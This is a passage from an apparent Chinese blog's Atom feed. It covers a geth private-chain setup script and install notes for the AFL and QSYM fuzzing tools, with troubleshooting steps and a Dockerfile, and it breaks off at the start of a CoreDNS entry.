&lt;li&gt;&lt;code&gt;puppeth&lt;/code&gt; 用于生成创世块的配置文件，这个命令是交互式的，编写了一个&lt;code&gt;puppeth.txt&lt;/code&gt;作为其输入，默认生成一个基于pow的区块链&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bootnode&lt;/code&gt; 用于生成启动bootnode&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;这一步使用了以下几个linux命令&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sed&lt;/code&gt; 非交互式的文本编辑器，用于读取生成的账户的区块链地址，写入&lt;code&gt;puppeth.txt&lt;/code&gt;中，使得&lt;code&gt;puppeth&lt;/code&gt;工具能为初始的两个节点分配一定的以太币&lt;/li&gt;
&lt;li&gt;&lt;code&gt;awk&lt;/code&gt;，用于对文本的处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;setup.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; node1 node2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node1 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node2 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node1/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node2/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;puppeth &amp;lt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node1 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node2 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node1/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node2/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -genkey boot.key&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -nodekey boot.key -addr :30305&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;两个输入文件的内容&quot;&gt;&lt;a href=&quot;#两个输入文件的内容&quot; class=&quot;headerlink&quot; title=&quot;两个输入文件的内容&quot;&gt;&lt;/a&gt;两个输入文件的内容&lt;/h3&gt;</summary>
    
    
    
    <category term="misc" scheme="https://jingtianer.github.io/home/categories/misc/"/>
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/tags/linux/"/>
    
    <category term="geth" scheme="https://jingtianer.github.io/home/tags/geth/"/>
    
    <category term="blockchain" scheme="https://jingtianer.github.io/home/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>QSYM-afl-环境安装</title>
    <link href="https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <id>https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</id>
    <published>2023-01-07T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl的安装"><a href="#afl的安装" class="headerlink" title="afl的安装"></a>afl的安装</h2><ul><li>安装<code>build-essentials</code>和<code>cmake</code></li><li>github下载源码并解压</li><li><code>make</code></li><li><code>make install</code></li></ul><p><code>usr/local/bin</code>下有了编译好的afl工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@tt-HP:~/dns_env<span class="comment"># find /usr/local/bin/afl*</span></span><br><span class="line">/usr/local/bin/afl-analyze</span><br><span class="line">/usr/local/bin/afl-clang</span><br><span class="line">/usr/local/bin/afl-clang++</span><br><span class="line">/usr/local/bin/afl-cmin</span><br><span class="line">/usr/local/bin/afl-fuzz</span><br><span class="line">/usr/local/bin/afl-g++</span><br><span class="line">/usr/local/bin/afl-gcc</span><br><span class="line">/usr/local/bin/afl-gotcpu</span><br><span class="line">/usr/local/bin/afl-plot</span><br><span class="line">/usr/local/bin/afl-showmap</span><br><span class="line">/usr/local/bin/afl-tmin</span><br><span class="line">/usr/local/bin/afl-whatsup</span><br></pre></td></tr></table></figure><h2 id="qsym的安装"><a href="#qsym的安装" class="headerlink" title="qsym的安装"></a>qsym的安装</h2><ul><li>以下是安装方法<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># install z3 and system deps</span></span><br><span class="line">$ ./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># install using virtual env</span></span><br><span class="line">$ virtualenv venv</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line">$ pip install .</span><br></pre></td></tr></table></figure><blockquote><p>不用wsl用vm就不会有很多问题</p></blockquote></li></ul><h3 id="ptrace置0"><a href="#ptrace置0" class="headerlink" title="ptrace置0"></a>ptrace置0</h3><p>可能是由于内核版本问题，<code>/proc/sys/kernel/yama/ptrace_scope</code>文件不存在，查到可以修改另一个文件 <code>/etc/sysctl.d/10-ptrace.conf</code>，添加或修改以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.yama.ptrace_scope = 0</span><br></pre></td></tr></table></figure><p>在<code>setup.sh</code>中会对这个<code>/proc/sys/kernel/yama/ptrace_scope</code>文件中的值是否为0进行判断，由于我没有，将脚本中这几行删掉</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="子模块下载问题"><a href="#子模块下载问题" class="headerlink" title="子模块下载问题"></a>子模块下载问题</h3><p>安装过程中发现<code>git submodule</code>下载不下来，使用递归的方式重新clone</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sslab-gatech/qsym.git --recursive</span><br></pre></td></tr></table></figure><p>在<code>setup.sh</code>把git submodule 去掉</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure><h3 id="配置PYTHON环境变量"><a href="#配置PYTHON环境变量" class="headerlink" title="配置PYTHON环境变量"></a>配置PYTHON环境变量</h3><p>观察到setup.sh中，get-pip时需要使用python2环境，提示需要<code>PYTHON环境变量</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">export</span> PYTHON=$(<span class="built_in">echo</span> $(whereis python2) | awk <span class="string">&#x27;&#123;split($0, arr, &quot; &quot;); print arr[2]&#125;&#x27;</span>) | <span class="built_in">tee</span> -a ~/.bashrc </span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="找不到bits-h"><a href="#找不到bits-h" class="headerlink" title="找不到bits/*.h"></a>找不到<code>bits/*.h</code></h3><ul><li>安装multilib<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/test</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y g++-multilib</span><br></pre></td></tr></table></figure></li></ul><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install virtualenv</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><h3 id="安装lsb"><a href="#安装lsb" class="headerlink" title="安装lsb"></a>安装lsb</h3><ul><li>进行<code>pip install .</code>时可能报错<code>make: lsb_release: Command not found</code>，安装lsb既可</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lsb-core</span><br></pre></td></tr></table></figure><blockquote><p>最终在vm的ubuntu 16.04下成功进行了安装，python环境是python3.7.9（ubuntu 16.04需要下载python3.7源码编译安装）（python2环境也成功了，其实不应该安装python3，整个项目都应该运行在python2环境下）</p></blockquote><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tests</span><br><span class="line">python build.py</span><br><span class="line">python -m pytest -n $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure><ul><li><p>requirements</p><ul><li><code>pip install python-afl</code></li></ul></li><li><p>运行结果</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/qsym/tests$ python -m pytest -n $(<span class="built_in">nproc</span>)</span><br><span class="line">============================= <span class="built_in">test</span> session starts ==============================</span><br><span class="line">platform linux2 -- Python 2.7.12, pytest-4.6.11, py-1.11.0, pluggy-0.13.1</span><br><span class="line">rootdir: /home/tt/Desktop/dns/qsym</span><br><span class="line">plugins: forked-1.3.0, xdist-1.34.0</span><br><span class="line">gw0 [250] / gw1 [250] / gw2 [250] / gw3 [250]</span><br><span class="line">........................................................................ [ 28%]</span><br><span class="line">........................................................................ [ 57%]</span><br><span class="line">........................................................................ [ 86%]</span><br><span class="line">..................................                                                                                                                                                                   [100%]</span><br><span class="line">======================================================================================= 250 passed <span class="keyword">in</span> 565.71 seconds =======================================================================================</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用docker安装qsym"><a href="#使用docker安装qsym" class="headerlink" title="使用docker安装qsym"></a>使用docker安装qsym</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># build docker image</span></span><br><span class="line">$ docker build -t qsym ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># run docker image</span></span><br><span class="line">$ docker run --cap-add=SYS_PTRACE -it qsym /bin/bash</span><br></pre></td></tr></table></figure><h3 id="错误1"><a href="#错误1" class="headerlink" title="错误1"></a>错误1</h3><ul><li>ERROR [internal] load metadata for docker.io&#x2F;library&#x2F;ubuntu:16.04</li></ul><p>在docker中的<code>daemon.json</code>中修改buildkit为false</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;buildkit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ptrace置0-1"><a href="#ptrace置0-1" class="headerlink" title="ptrace置0"></a>ptrace置0</h3><ul><li>使用docker时，build时的ubuntu镜像也没有这个<code>/proc/sys/kernel/yama/ptrace_scope</code>文件。setup.sh中将脚本中这几行删掉<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="最终的dockerfile"><a href="#最终的dockerfile" class="headerlink" title="最终的dockerfile"></a>最终的dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jingtianer: 国内源</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git build-essential sudo python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y lsb-core</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y libc6 libstdc++6 linux-libc-dev gcc-multilib g++-multilib \</span></span><br><span class="line"><span class="language-bash">  llvm-dev g++ g++-multilib python \</span></span><br><span class="line"><span class="language-bash">  lsb-release</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y gcc make python-pip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /workdir/qsym</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># jingtianer: pip清华源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN echo kernel.yama.ptrace_scope = 0 | sudo tee /etc/sysctl.d/10-ptrace.conf</span></span><br><span class="line"><span class="comment"># jingtianer: ptrace置为0</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install python-afl</span></span><br><span class="line"><span class="comment"># jingtianer: test需要的依赖包</span></span><br></pre></td></tr></table></figure><blockquote><p>docker 方式在ubuntu22.04中配置安装，但是不能成功运行测试代码</p></blockquote><blockquote><p>两种方法都无法在wsl中使用，缺少文件夹<code>/proc/sys/kernel/yama</code><br>两种方法在编译时都存在warnings</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;afl的安装&quot;&gt;&lt;a href=&quot;#afl的安装&quot; class=&quot;headerlink&quot; title=&quot;afl的安装&quot;&gt;&lt;/a&gt;afl的安装&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;安装&lt;code&gt;build-essentials&lt;/code&gt;和&lt;code&gt;cmake&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;github下载源码并解压&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;usr/local/bin&lt;/code&gt;下有了编译好的afl工具&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@tt-HP:~/dns_env&lt;span class=&quot;comment&quot;&gt;# find /usr/local/bin/afl*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-analyze&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-cmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-fuzz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-g++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gotcpu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-plot&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-showmap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-tmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-whatsup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;qsym的安装&quot;&gt;&lt;a href=&quot;#qsym的安装&quot; class=&quot;headerlink&quot; title=&quot;qsym的安装&quot;&gt;&lt;/a&gt;qsym的安装&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;以下是安装方法&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# disable ptrace_scope for PIN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; 0|sudo &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; /proc/sys/kernel/yama/ptrace_scope&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install z3 and system deps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install using virtual env&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ virtualenv venv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; venv/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ pip install .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;不用wsl用vm就不会有很多问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
  </entry>
  
  <entry>
    <title>CoreDNS安装使用</title>
    <link href="https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/"/>
    <id>https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/</id>
    <published>2023-01-01T04:15:37.000Z</published>
